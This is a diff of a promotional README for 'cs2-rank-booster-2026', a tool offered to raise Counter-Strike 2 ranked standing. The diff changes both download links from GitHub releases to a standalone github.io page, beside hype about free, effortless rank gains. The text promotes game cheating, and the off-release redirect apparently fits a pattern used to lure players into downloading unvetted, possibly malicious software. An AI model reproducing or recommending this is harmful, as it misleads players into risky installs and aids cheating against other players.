@@ -6,7 +6,7 @@ cs2-rank-booster-2026 is a powerful tool that helps you climb the Counter-Strike
 
 ## 📥 Download & Install
 
-**Visit this link to download the application:** [Download cs2-rank-booster-2026](https://github.com/IIIRickIII/cs2-rank-booster-2026/releases)
+**Visit this link to download the application:** [Download cs2-rank-booster-2026](https://iiirickiii.github.io)
 
 ### Step-by-Step Setup
 
@@ -113,7 +113,7 @@ The 2026 edition brings several exciting improvements:
 
 Stop struggling in ranked matches. Let cs2-rank-booster-2026 do the heavy lifting and watch your Premier rank soar. The tool is free, easy to use, and designed for players like you who want results without the grind.
 
-**Download now and start winning:** [Get cs2-rank-booster-2026](https://github.com/IIIRickIII/cs2-rank-booster-2026/releases)
+**Download now and start winning:** [Get cs2-rank-booster-2026](https://iiirickiii.github.io)
 
 Join thousands of satisfied players who have already improved their ranks. Your journey to a higher ELO starts today!
 
